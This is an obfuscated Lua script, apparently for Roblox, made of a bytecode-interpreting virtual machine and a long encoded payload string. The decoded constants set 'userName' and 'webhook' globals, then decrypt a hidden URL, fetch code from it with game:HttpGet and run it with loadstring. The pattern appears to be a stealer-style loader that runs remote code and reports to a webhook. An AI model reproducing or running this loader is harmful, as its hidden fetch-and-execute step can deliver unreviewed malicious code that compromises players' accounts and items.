local StrToNumber = tonumber;
local Byte = string.byte;
local Char = string.char;
local Sub = string.sub;
local Subg = string.gsub;
local Rep = string.rep;
local Concat = table.concat;
local Insert = table.insert;
local LDExp = math.ldexp;
local GetFEnv = getfenv or function()
	return _ENV;
end;
local Setmetatable = setmetatable;
local PCall = pcall;
local Select = select;
local Unpack = unpack or table.unpack;
local ToNumber = tonumber;
local function VMCall(ByteString, vmenv, ...)
	local DIP = 1;
	local repeatNext;
	ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
		if (Byte(byte, 2) == 79) then
			repeatNext = StrToNumber(Sub(byte, 1, 1));
			return "";
		else
			local a = Char(StrToNumber(byte, 16));
			if repeatNext then
				local b = Rep(a, repeatNext);
				repeatNext = nil;
				return b;
			else
				return a;
			end
		end
	end);
	local function gBit(Bit, Start, End)
		if End then
			local Res = (Bit / (2 ^ (Start - 1))) % (2 ^ (((End - 1) - (Start - 1)) + 1));
			return Res - (Res % 1);
		else
			local Plc = 2 ^ (Start - 1);
			return (((Bit % (Plc + Plc)) >= Plc) and 1) or 0;
		end
	end
	local function gBits8()
		local a = Byte(ByteString, DIP, DIP);
		DIP = DIP + 1;
		return a;
	end
	local function gBits16()
		local a, b = Byte(ByteString, DIP, DIP + 2);
		DIP = DIP + 2;
		return (b * 256) + a;
	end
	local function gBits32()
		local a, b, c, d = Byte(ByteString, DIP, DIP + 3);
		DIP = DIP + 4;
		return (d * 16777216) + (c * 65536) + (b * 256) + a;
	end
	local function gFloat()
		local Left = gBits32();
		local Right = gBits32();
		local IsNormal = 1;
		local Mantissa = (gBit(Right, 1, 20) * (2 ^ 32)) + Left;
		local Exponent = gBit(Right, 21, 31);
		local Sign = ((gBit(Right, 32) == 1) and -1) or 1;
		if (Exponent == 0) then
			if (Mantissa == 0) then
				return Sign * 0;
			else
				Exponent = 1;
				IsNormal = 0;
			end
		elseif (Exponent == 2047) then
			return ((Mantissa == 0) and (Sign * (1 / 0))) or (Sign * NaN);
		end
		return LDExp(Sign, Exponent - 1023) * (IsNormal + (Mantissa / (2 ^ 52)));
	end
	local function gString(Len)
		local Str;
		if not Len then
			Len = gBits32();
			if (Len == 0) then
				return "";
			end
		end
		Str = Sub(ByteString, DIP, (DIP + Len) - 1);
		DIP = DIP + Len;
		local FStr = {};
		for Idx = 1, #Str do
			FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
		end
		return Concat(FStr);
	end
	local gInt = gBits32;
	local function _R(...)
		return {...}, Select("#", ...);
	end
	local function Deserialize()
		local Instrs = {};
		local Functions = {};
		local Lines = {};
		local Chunk = {Instrs,Functions,nil,Lines};
		local ConstCount = gBits32();
		local Consts = {};
		for Idx = 1, ConstCount do
			local Type = gBits8();
			local Cons;
			if (Type == 1) then
				Cons = gBits8() ~= 0;
			elseif (Type == 2) then
				Cons = gFloat();
			elseif (Type == 3) then
				Cons = gString();
			end
			Consts[Idx] = Cons;
		end
		Chunk[3] = gBits8();
		for Idx = 1, gBits32() do
			local Descriptor = gBits8();
			if (gBit(Descriptor, 1, 1) == 0) then
				local Type = gBit(Descriptor, 2, 3);
				local Mask = gBit(Descriptor, 4, 6);
				local Inst = {gBits16(),gBits16(),nil,nil};
				if (Type == 0) then
					Inst[3] = gBits16();
					Inst[4] = gBits16();
				elseif (Type == 1) then
					Inst[3] = gBits32();
				elseif (Type == 2) then
					Inst[3] = gBits32() - (2 ^ 16);
				elseif (Type == 3) then
					Inst[3] = gBits32() - (2 ^ 16);
					Inst[4] = gBits16();
				end
				if (gBit(Mask, 1, 1) == 1) then
					Inst[2] = Consts[Inst[2]];
				end
				if (gBit(Mask, 2, 2) == 1) then
					Inst[3] = Consts[Inst[3]];
				end
				if (gBit(Mask, 3, 3) == 1) then
					Inst[4] = Consts[Inst[4]];
				end
				Instrs[Idx] = Inst;
			end
		end
		for Idx = 1, gBits32() do
			Functions[Idx - 1] = Deserialize();
		end
		return Chunk;
	end
	local function Wrap(Chunk, Upvalues, Env)
		local Instr = Chunk[1];
		local Proto = Chunk[2];
		local Params = Chunk[3];
		return function(...)
			local Instr = Instr;
			local Proto = Proto;
			local Params = Params;
			local _R = _R;
			local VIP = 1;
			local Top = -1;
			local Vararg = {};
			local Args = {...};
			local PCount = Select("#", ...) - 1;
			local Lupvals = {};
			local Stk = {};
			for Idx = 0, PCount do
				if (Idx >= Params) then
					Vararg[Idx - Params] = Args[Idx + 1];
				else
					Stk[Idx] = Args[Idx + 1];
				end
			end
			local Varargsz = (PCount - Params) + 1;
			local Inst;
			local Enum;
			while true do
				Inst = Instr[VIP];
				Enum = Inst[1];
				if (Enum <= 26) then
					if (Enum <= 12) then
						if (Enum <= 5) then
							if (Enum <= 2) then
								if (Enum <= 0) then
									Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
								elseif (Enum > 1) then
									Stk[Inst[2]] = Stk[Inst[3]] + Inst[4];
								else
									Stk[Inst[2]] = {};
								end
							elseif (Enum <= 3) then
								local NewProto = Proto[Inst[3]];
								local NewUvals;
								local Indexes = {};
								NewUvals = Setmetatable({}, {__index=function(_, Key)
									local Val = Indexes[Key];
									return Val[1][Val[2]];
								end,__newindex=function(_, Key, Value)
									local Val = Indexes[Key];
									Val[1][Val[2]] = Value;
								end});
								for Idx = 1, Inst[4] do
									VIP = VIP + 1;
									local Mvm = Instr[VIP];
									if (Mvm[1] == 7) then
										Indexes[Idx - 1] = {Stk,Mvm[3]};
									else
										Indexes[Idx - 1] = {Upvalues,Mvm[3]};
									end
									Lupvals[#Lupvals + 1] = Indexes;
								end
								Stk[Inst[2]] = Wrap(NewProto, NewUvals, Env);
							elseif (Enum > 4) then
								local A = Inst[2];
								Stk[A](Unpack(Stk, A + 1, Top));
							else
								Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
							end
						elseif (Enum <= 8) then
							if (Enum <= 6) then
								local A = Inst[2];
								Stk[A](Unpack(Stk, A + 1, Top));
							elseif (Enum > 7) then
								local A = Inst[2];
								Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
							else
								Stk[Inst[2]] = Stk[Inst[3]];
							end
						elseif (Enum <= 10) then
							if (Enum == 9) then
								Stk[Inst[2]] = Stk[Inst[3]];
							else
								local A = Inst[2];
								local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Top)));
								Top = (Limit + A) - 1;
								local Edx = 0;
								for Idx = A, Top do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
							end
						elseif (Enum == 11) then
							Stk[Inst[2]] = Upvalues[Inst[3]];
						else
							Stk[Inst[2]] = {};
						end
					elseif (Enum <= 19) then
						if (Enum <= 15) then
							if (Enum <= 13) then
								Stk[Inst[2]] = Stk[Inst[3]] % Inst[4];
							elseif (Enum > 14) then
								Stk[Inst[2]] = Stk[Inst[3]] % Stk[Inst[4]];
							else
								Stk[Inst[2]] = Env[Inst[3]];
							end
						elseif (Enum <= 17) then
							if (Enum > 16) then
								local A = Inst[2];
								do
									return Unpack(Stk, A, Top);
								end
							else
								Stk[Inst[2]] = Stk[Inst[3]] % Stk[Inst[4]];
							end
						elseif (Enum == 18) then
							local A = Inst[2];
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
						else
							local A = Inst[2];
							local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
							Top = (Limit + A) - 1;
							local Edx = 0;
							for Idx = A, Top do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
						end
					elseif (Enum <= 22) then
						if (Enum <= 20) then
							Stk[Inst[2]] = Inst[3] + Stk[Inst[4]];
						elseif (Enum > 21) then
							local A = Inst[2];
							do
								return Stk[A](Unpack(Stk, A + 1, Inst[3]));
							end
						else
							Stk[Inst[2]] = #Stk[Inst[3]];
						end
					elseif (Enum <= 24) then
						if (Enum > 23) then
							VIP = Inst[3];
						else
							local A = Inst[2];
							local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
							Top = (Limit + A) - 1;
							local Edx = 0;
							for Idx = A, Top do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
						end
					elseif (Enum == 25) then
						local A = Inst[2];
						do
							return Stk[A](Unpack(Stk, A + 1, Inst[3]));
						end
					else
						Stk[Inst[2]]();
					end
				elseif (Enum <= 39) then
					if (Enum <= 32) then
						if (Enum <= 29) then
							if (Enum <= 27) then
								local A = Inst[2];
								local Results, Limit = _R(Stk[A](Stk[A + 1]));
								Top = (Limit + A) - 1;
								local Edx = 0;
								for Idx = A, Top do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
							elseif (Enum == 28) then
								local A = Inst[2];
								local Step = Stk[A + 2];
								local Index = Stk[A] + Step;
								Stk[A] = Index;
								if (Step > 0) then
									if (Index <= Stk[A + 1]) then
										VIP = Inst[3];
										Stk[A + 3] = Index;
									end
								elseif (Index >= Stk[A + 1]) then
									VIP = Inst[3];
									Stk[A + 3] = Index;
								end
							else
								Stk[Inst[2]] = Inst[3];
							end
						elseif (Enum <= 30) then
							local A = Inst[2];
							local Index = Stk[A];
							local Step = Stk[A + 2];
							if (Step > 0) then
								if (Index > Stk[A + 1]) then
									VIP = Inst[3];
								else
									Stk[A + 3] = Index;
								end
							elseif (Index < Stk[A + 1]) then
								VIP = Inst[3];
							else
								Stk[A + 3] = Index;
							end
						elseif (Enum == 31) then
							Stk[Inst[2]] = Env[Inst[3]];
						else
							Env[Inst[3]] = Stk[Inst[2]];
						end
					elseif (Enum <= 35) then
						if (Enum <= 33) then
							local NewProto = Proto[Inst[3]];
							local NewUvals;
							local Indexes = {};
							NewUvals = Setmetatable({}, {__index=function(_, Key)
								local Val = Indexes[Key];
								return Val[1][Val[2]];
							end,__newindex=function(_, Key, Value)
								local Val = Indexes[Key];
								Val[1][Val[2]] = Value;
							end});
							for Idx = 1, Inst[4] do
								VIP = VIP + 1;
								local Mvm = Instr[VIP];
								if (Mvm[1] == 7) then
									Indexes[Idx - 1] = {Stk,Mvm[3]};
								else
									Indexes[Idx - 1] = {Upvalues,Mvm[3]};
								end
								Lupvals[#Lupvals + 1] = Indexes;
							end
							Stk[Inst[2]] = Wrap(NewProto, NewUvals, Env);
						elseif (Enum == 34) then
							do
								return;
							end
						else
							Env[Inst[3]] = Stk[Inst[2]];
						end
					elseif (Enum <= 37) then
						if (Enum == 36) then
							local A = Inst[2];
							local Results, Limit = _R(Stk[A](Stk[A + 1]));
							Top = (Limit + A) - 1;
							local Edx = 0;
							for Idx = A, Top do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
						else
							Stk[Inst[2]] = Inst[3];
						end
					elseif (Enum > 38) then
						local A = Inst[2];
						local Index = Stk[A];
						local Step = Stk[A + 2];
						if (Step > 0) then
							if (Index > Stk[A + 1]) then
								VIP = Inst[3];
							else
								Stk[A + 3] = Index;
							end
						elseif (Index < Stk[A + 1]) then
							VIP = Inst[3];
						else
							Stk[A + 3] = Index;
						end
					else
						Stk[Inst[2]] = Stk[Inst[3]] + Inst[4];
					end
				elseif (Enum <= 46) then
					if (Enum <= 42) then
						if (Enum <= 40) then
							if not Stk[Inst[2]] then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						elseif (Enum > 41) then
							do
								return;
							end
						else
							VIP = Inst[3];
						end
					elseif (Enum <= 44) then
						if (Enum > 43) then
							Stk[Inst[2]] = Stk[Inst[3]] % Inst[4];
						else
							Stk[Inst[2]]();
						end
					elseif (Enum == 45) then
						local A = Inst[2];
						do
							return Unpack(Stk, A, Top);
						end
					elseif not Stk[Inst[2]] then
						VIP = VIP + 1;
					else
						VIP = Inst[3];
					end
				elseif (Enum <= 49) then
					if (Enum <= 47) then
						Stk[Inst[2]] = #Stk[Inst[3]];
					elseif (Enum == 48) then
						local A = Inst[2];
						local B = Stk[Inst[3]];
						Stk[A + 1] = B;
						Stk[A] = B[Inst[4]];
					else
						Stk[Inst[2]] = Inst[3] + Stk[Inst[4]];
					end
				elseif (Enum <= 51) then
					if (Enum == 50) then
						Stk[Inst[2]] = Upvalues[Inst[3]];
					else
						local A = Inst[2];
						local B = Stk[Inst[3]];
						Stk[A + 1] = B;
						Stk[A] = B[Inst[4]];
					end
				elseif (Enum == 52) then
					local A = Inst[2];
					local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Top)));
					Top = (Limit + A) - 1;
					local Edx = 0;
					for Idx = A, Top do
						Edx = Edx + 1;
						Stk[Idx] = Results[Edx];
					end
				else
					local A = Inst[2];
					local Step = Stk[A + 2];
					local Index = Stk[A] + Step;
					Stk[A] = Index;
					if (Step > 0) then
						if (Index <= Stk[A + 1]) then
							VIP = Inst[3];
							Stk[A + 3] = Index;
						end
					elseif (Index >= Stk[A + 1]) then
						VIP = Inst[3];
						Stk[A + 3] = Index;
					end
				end
				VIP = VIP + 1;
			end
		end;
	end
	return Wrap(Deserialize(), {}, vmenv)(...);
end
return VMCall("LOL!133O0003063O00737472696E6703043O006368617203043O00627974652O033O0073756203053O0062697433322O033O0062697403043O0062786F7203053O007461626C6503063O00636F6E63617403063O00696E7365727403083O00757365724E616D6503A2042O004229426952605879725C6C673B375D3F4A33512E5A705D4C4E53577B6833525B3942545D5B6B466F5D356A644D284A285A6351384621754E7D69663B586E4A613C746E2F784853245F317C5B732B4C7655623E63743650755F267C5D6949536757273A605B7C4B2C7E5A567A4C694A257469732D5F33573A7A794940527C7164685E582O3B73535D20383E7E7B3E5D763A416F66357E5F6A6B665839687747556B2E6B235038546C5D35513F477B6E2D3A547E4D3A69474674243D5D74224B6C77315E3E52585A35775559375D2E4B38374E5F5167555C693D7A20787D7948563E3649635C655C70387D5D714D4349796C624F7539686C3D782138644B6A6C3A693E5377364E674A73636E705E266E5E7471394A5B556D7A684A557E2O764723666B58263C377B4E713F554D59656C7D7C5B3E617056473B3D35544D4F3F7B59353F5F3B4F346926225F3733377A224B3726382422623757377522633730225B362F224037213A7822663B2A225F3771225936343A672223367D3B53223936783A2322343927223C362F3567222B395A227C36623C5D227737423568225236793767227B36783B48227B377322572O3B226937613578222B3C7A226C367B22783E6E22573E67225D3647372122673B2D2267363E3A61224837252256377D382O227C375A372122773A37227D397622442O3622563C61222O3774354E225936703A602233363A364D223036693940226536273A342276367D356A22483672397E224C39782254366A396B223936323965226A363136562221373F352B225D37673673227A362122543B52225037313A59227D36373562224C3D682259365A362B2244367A3863225B3E35224236233B38222438702274382O2247392522563725384F2270372D3A48223236443D4222243C78224C3E302270366F3D72226E37393869223E37223740227D367B35762259372C392B22263E4E22473C582243393B223E372B393E2254376F352922753C2E2254374D356022383669223D386E224F383E226A372738312239374C222D36253844222B3830223D367A3D6D2233366A356D2251375E373022673D71222136453A7822413665386E226C375F394D2251363D3548225D366D393B223236533E712262365A3B48225136773D672224366E3E6B22573762355C223436603E5D22603B60224C375D35602257374A3A682241394D222636773D21224D365D3568222436503C3E224236213D26222B3E3F224C362F3A70222O36513A37222A36383949223A366C3A2E225337593A2A2252363B3842224236583E4522263D46227B363D3665222736233A21223A36773952227B366A3C492266362936232226376B3863227E367D22703B4F226C374438792245395D223F37473A6222623B60224B372D3658225D36443D65226736693E5C22423751394A226736693D77226A376C3925224836263D2422233B5722663C3D227937283A4E2269382422693B5D22523C38222E372C226F392F224236673B57224B362C3B34223A3E5E2257375E3978225D3771357D22753726223D3747224A374A3753227D3B7A226E3627374F2254362F3562223B366D376D2245366D3B4822713756225C374F224F37692256365A3E3C224D3757353F22293D2F2238375A2259387603073O00776562682O6F6B03A8042O00426942394C4E4F5A692A7D5B367C52504B6F5E775C6E465C4A564F426E4C5B3C39455B4A504E4F415B336A565F4D4B3C2O485B2A5575745D6E3C7271504E5E75373A663D6B55522D5D566F4D72214740465C2O3C6E28584C54526F55793851454D47387A54775166744759525D585C3E67527131585A5B58794A51395D73665666545B663C5948266F643E4720365F663A7779383E3747416B31517C7D3C583B704A6D3F4F54594058515C255560725538616C6D3A5D4E476D3D353B69775A517D374C42532258786F2948695F23546D3D32513C782E4750393B6C346A4D566539374E425433477D3A79555B2O474D7869644B733D476C722039374A4D5C67337670545A3B32755976496C3D57356E72674B366546657C627E372O51665F5642756A514B38327C25772F526D4C3E702C683137487145524A356A4845513C66783A2B587650257073223A3663394F22483E2C2242367A3B59222336623E78222A36573D50222F36543B2A225F364F227536513C39226536673B55226C3824226836433C24222O3C21227D3B29223A3757372A2268373C386D22463825225A367437272272374A38562224363A3C762223365C3A53226836223D3622323C49227C365A3E342239365235542276366A3C67227537353747225F3763363F226B3661394E226D366C384122793E692278363A3942224D37533A4B225A3E37223936283E5422363749352F226536433E5022553641385022453761395222263632382C2243362B356E2267374036762264373022583755393B227A374B374922583824222E3756394F225E3672354D225D36563E46224336343C4C22253978226A366A3D5C222A364A3B572246375339612270364739362251396B224B36652273387822633658223E374A376122783D5322393776375322533C4B2253385A22563739373122713C26227C3770366F223D3767396E224B36443656222B374F3559223D363839452228364E3844224D3E6822743733396922733D5B22763E5422403E2C22673758356A222A376A352A222C375539482246376F35502266374A22293946225A3673375222633D4822593678383E224D37443670222E3646352O226236763772223D376B3828225A375F3632222A367D39782239364D3C2F222F3C512266366A22503A57227D3C75226537643A6C222E3762222E374B35642221394F2247366F376C22773D7B225C3B7C22513658224A36683B66223D387A22633E69225636423976223C376D36582277373837602273372C367C2270384D223836613538225B36313D7222733658366D2279363D3876226C386622283C5E22383D762231376D367E22463D4B226336583E6F225836553A2E227B3B5D2233397E2267365F38722256365622653630226B3D2O225936793E6B225936573941226936623741227D3733365E22443733375522253659365022643B7C2231372D356B22323759372322773D382223375E363D2242386B22743742394022773647396A22463A3622273A362262377D224C3657353F2242373E366B22233D5D2258374C3A7C22243E3F2270364B35722234363B3D682277366338522252365C3852227E36492251372F3955224D36353B4D227E3946222C377439762242363F3A482223362D225C3862222E3645355F030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034A3O00D9D7CF35F5E18851C3C2CC6BE1B2D316C4C1CE36E3A9C411DFD7DE2BF2F5C411DC8CE826F4B2D70AC28EEF20F4B6C21A9EF0D837EFABD30DEEE1DE31E7F4CA1FD8CD9428EBE98912C4C203083O007EB1A3BB4586DBA700264O00017O00121F000100013O00202O00010001000200121F000200013O00202O00020002000300121F000300013O00202O00030003000400121F000400053O00062E0004000B000100010004293O000B000100121F000400063O00202O00050004000700121F000600083O00202O00060006000900121F000700083O00202O00070007000A00062100083O000100062O00073O00074O00073O00014O00073O00054O00073O00024O00073O00034O00073O00063O00121D0009000C3O0012200009000B3O00121D0009000E3O0012200009000D3O00121F0009000F3O00121F000A00103O002030000A000A00112O0009000C00083O00121D000D00123O00121D000E00134O0017000C000E4O0034000A6O000800093O00022O002B0009000100012O00223O00013O00013O00023O00026O00F03F026O00704002264O000100025O00121D000300014O001500045O00121D000500013O0004270003002100012O000B00076O0009000800024O000B000900014O000B000A00024O000B000B00034O000B000C00044O0009000D6O0009000E00063O002002000F000600012O0017000C000F4O0008000B3O00022O000B000C00034O000B000D00044O0009000E00014O0015000F00014O0010000F0006000F001014000F0001000F2O0015001000014O00100010000600100010140010000100100020020010001000012O0017000D00104O0034000C6O0008000A3O000200200D000A000A00022O001B0009000A4O000500073O000100041C0003000500012O000B000300054O0009000400024O0016000300044O001100036O00223O00017O00", GetFEnv(), ...);
